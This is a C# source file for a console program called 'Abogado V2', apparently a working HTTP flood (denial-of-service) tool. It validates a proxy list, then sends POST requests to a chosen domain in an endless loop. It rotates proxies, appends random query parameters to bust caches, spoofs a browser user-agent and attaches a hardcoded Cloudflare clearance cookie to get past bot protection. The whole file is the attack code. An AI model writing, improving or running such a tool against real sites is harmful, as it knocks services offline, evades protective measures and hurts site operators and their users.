#nullable disable
using System.Net;
using System.Net.Sockets;
using System.Text;
using AbogadoV2.Extensions;
using AbogadoV2.Providers;
using Figgle;
using Microsoft.Extensions.DependencyInjection;
using Serilog;
using HttpClient = System.Net.Http.HttpClient;

namespace AbogadoV2;

internal class Program
{
    private static IServiceProvider _services;
    private static int _requestCount;
    private static int _testedCount;
    private static string _domain;
    private static readonly HashSet<string> RandomDataArgs = new();
    private static int _randomLength = 80;


    private static async Task Main(string[] args)
    {
        for (var i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "-d":
                    if (i + 1 < args.Length)
                    {
                        _domain = args[++i];
                    }
                    break;
                case "-rd":
                    if (i + 1 < args.Length)
                    {
                        var dataItems = args[++i].Split(',');
                        foreach (var dataItem in dataItems)
                        {
                            RandomDataArgs.Add(dataItem);
                        }
                    }
                    break;
                case "-randomlength":
                    if (i + 1 < args.Length)
                    {
                        if (int.TryParse(args[++i], out var length))
                        {
                            _randomLength = length;
                        }
                        else
                        {
                            Log.Error("Invalid random length {Length}", args[i]);
                            return;
                        }
                    }
                    break;
            }
        }

        // Startup
        Console.WriteLine(
            FiggleFonts.Ogre.Render("Abogado V2"));
        LogSetup.SetupLogger("Abogado V2");
        Log.Information("Starting Abogado V2.....");

        if (string.IsNullOrEmpty(_domain))
        {
            Log.Error("No domain specified. Exiting");
            return;
        }

        // Proxy Testing
        ConfigureServices();
        var proxyProvider = _services.GetRequiredService<IProxyProvider>();
        Log.Information("Testing all proxies...");
        var working = await TestProxiesInParallelAsync(proxyProvider.GetAllProxies());
        Log.Information("{WorkingCount} Proxies are working and have been written", working.Count);

        // Write working proxies to file
        await File.WriteAllLinesAsync("proxies.txt", working.Where(x => !string.IsNullOrWhiteSpace(x)));

        // Exit if list is empty
        if (!proxyProvider.GetAllProxies().Any())
        {
            Log.Error("No useable proxies. Exiting");
            return;
        }

        // Start request updater
        _ = UpdateConsole();

        // Start sending requests
        while (true)
        {
            _ = SendRequestWithRandomProxy();
            await Task.Delay(1); // Somehow this stops a 10gb memory leak????
        }

    }

    private static async Task UpdateConsole()
    {
        var periodicTimer = new PeriodicTimer(TimeSpan.FromSeconds(10));
        while (await periodicTimer.WaitForNextTickAsync())
        {
            Log.Information("Request Count: {RequestCount}", _requestCount);
            Thread.Sleep(5000); // wait for 5 seconds
        }
    }

    private static void ConfigureServices()
    {
        var services = new ServiceCollection();

        // :sparkles: Dependency Injection :sparkles:
        services.AddSingleton<IProxyProvider, ProxyProvider>();

        _services = services.BuildServiceProvider();
    }


    private static async Task<List<string>> TestProxiesInParallelAsync(IEnumerable<string> proxies)
    {
        // Gas Gas Gas....
        var tasks = proxies.Select(TestProxyAsync);
        var results = await Task.WhenAll(tasks);
        return new List<string>(results!);
    }

    private static async Task<string> TestProxyAsync(string proxy)
    {
        _testedCount++;
        Log.Information("Tested {TestedCount} Proxies", _testedCount);
        HttpClientHandler handler;
        try
        {
            handler = new HttpClientHandler
            {
                Proxy = new WebProxy(proxy),
                UseProxy = true,
            };
        }
        catch
        {
            // Woops! You need to put this cd in your computer.
            Log.Error("Format {Proxy} is not valid, removing...", proxy);
            return "";
        }

        using var client = new HttpClient(handler);
        try
        {
            client.Timeout = TimeSpan.FromSeconds(2);
            var response = await client.GetAsync("https://1.1.1.1");
            if (response.IsSuccessStatusCode)
            {
                return proxy; // Proxy is working
            }
        }
        catch
        {
            // Request failed, proxy is not working
            Log.Error("Proxy {Proxy} is not working, removing", proxy);
        }

        return ""; // Proxy is not working
    }

    private static async Task SendRequestWithRandomProxy()
    {
        var proxy = _services.GetRequiredService<IProxyProvider>().GetRandomProxy();
        try
        {
            _requestCount++;
            // Maybe cf bypass when botfight not on
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls13;

            // Create this stupid thing thats been bugging me for ages and i spent almost 2 days to fix to not leak memory reeeeeeee
            using var handler = new HttpClientHandler();
            handler.Proxy = new WebProxy(proxy);
            handler.UseProxy = true;

            // Add the cookie
            var collection = new CookieCollection
            {
                new Cookie("cf_clearance",
                    "Y5pM6cRu0QBaphaHmeYUXgUBgnv31Ye0hU1tMHw8JXE-1697982553-0-1-72d71f34.ee5eb8ca.25d640d4-250.2.1697982217",
                    "/", _domain)
            };
            handler.CookieContainer.Add(collection); // Eat the cookie

            // Create the client
            using var httpClient = new HttpClient(handler);

            // Start parsing whatever garbage was entered in the program args
            string fullDomain;
            if (RandomDataArgs.Count > 0)
            {
                var strBlder = new StringBuilder();
                strBlder.Append(_domain);
                foreach (var randomDataArg in RandomDataArgs)
                {
                    strBlder.Append(randomDataArg); // arg matey....
                    strBlder.Append('=');
                    strBlder.Append(StringExtensions.GenerateRandomString(_randomLength));
                }

                fullDomain = strBlder.ToString();
            }
            else
            {
                fullDomain = _domain;
            }
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
            await httpClient.PostAsync(fullDomain, null);
            // Have you not realized im going insane yet?
        }
        catch (Exception ex)
        {
            if (ex is SocketException { SocketErrorCode: SocketError.TimedOut })
            {
                // Yay not working proxies.
                Log.Error("Proxy {Proxy} timed out, removing...", proxy);
                _services.GetRequiredService<IProxyProvider>().RemoveProxy(proxy);
            }
        }
    }


}